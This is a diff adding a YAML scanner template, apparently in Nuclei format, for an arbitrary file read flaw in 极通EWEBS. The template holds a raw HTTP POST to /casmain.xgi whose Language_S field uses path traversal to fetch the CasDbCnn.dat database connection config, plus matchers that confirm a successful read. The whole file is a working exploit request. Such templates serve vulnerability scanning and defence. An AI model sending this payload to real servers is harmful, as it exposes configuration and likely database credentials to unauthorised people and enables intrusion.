@@ -1,0 +1,27 @@
+id: poc-yaml-jitong-ewebs-casmain-xgi-file-read
+info:
+  name: 极通EWEBS casmain.xgi 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    fingerprint: 极通EWEBS
+http:
+  - raw:
+      - |
+        POST /casmain.xgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Language_S=../../Data/CONFIG/CasDbCnn.dat
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[Edition]"
+          - "[LocalInfo]"
+          - "[LicHostPort]"
+        part: body
